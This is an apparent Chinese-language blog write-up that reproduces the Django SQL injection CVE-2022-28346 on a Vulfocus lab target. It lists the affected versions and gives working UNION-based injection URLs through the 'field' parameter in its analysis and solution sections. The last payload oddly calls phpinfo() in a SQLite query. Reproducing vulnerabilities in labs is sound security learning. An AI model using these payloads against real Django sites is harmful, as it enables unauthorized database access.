# 原创
：  【漏洞复现-django-SQL注入】vulfocus/django-cve_2022_28346

# 【漏洞复现-django-SQL注入】vulfocus/django-cve_2022_28346

**目录**

[一、靶场环境](#%E4%B8%80%E3%80%81%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83)

[1.1、平台：](#1.1%E3%80%81%E5%B9%B3%E5%8F%B0%EF%BC%9A)

[1.2、知识:](#1.2%E3%80%81%E6%BC%8F%E6%B4%9E%E7%89%88%E6%9C%AC%3A)

[1.3、描述：](#1.3%E3%80%81%E6%8F%8F%E8%BF%B0%EF%BC%9A)

[二、漏洞验证](#%E4%BA%8C%E3%80%81%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81)

[2.1、分析：](#2.1%E3%80%81%E5%88%86%E6%9E%90%EF%BC%9A)

[2.4、解题：](#2.4%E3%80%81%E8%A7%A3%E9%A2%98%EF%BC%9A)

---


## 一、靶场环境

> 
<h3>1.1、平台：</h3>
[Vulfocus 漏洞威胁分析平台](https://vulfocus.cn/)
123.58.224.8:36682

 
 （我之前实战中遇见过很多这种草率的页面，都以为放弃就没管了，害）<img alt="" height="317" src="https://img-blog.csdnimg.cn/a0348aa3295a467fa8c667963666cfa5.png" width="1012"/>
 


> 
<h3>1.2、知识:</h3>
1、报错回显参数（黑盒有点难遇见）
得找那种以前的老网站看看，关注回显的参数等信息
2、代码审计（白盒）
寻找危险函数，及用户可控的变量地方，跟踪变量，查看过滤机制，以及是否被带入SQL语句中执行



> 
<h3>1.3、描述：</h3>
1、Django在2.2.28 版本之前的2.2版本、3.2.13版本之前的3.2版本、4.0.4版本之前的4.0版本使用QuerySet.annotate() aggregate() extra()数据
2、QuerySet.annotate()、aggregate() 和 extra() 方法会通过精心制作的字典（带有字典扩展）作为传递的 **kwargs 在列别名中进行 SQL 注入。


---


---


## 二、漏洞验证

> 
<h3>2.1、分析：</h3>
查看报错页面，是否存在信息泄露
demo/

访问demo接口，分析是否有其他信息泄露，或能传参
报错信息提示了一个参数name

 访问：http://ip:port/demo?field=demo.name<br/><img alt="" height="301" src="https://img-blog.csdnimg.cn/2f3415774b6549b8a5d949d318d3e585.png" width="1023"/>
 
 POC：
http://ip:port/demo?field=demo.name" FROM "demo_user" union SELECT "1",sqlite_version(),"3" --

 




> 
<h3>2.4、解题：</h3>

http://123.58.224.8:36682/demo/?field=demo.name" FROM "demo_user" union SELECT "1",phpinfo(),"3" --

 

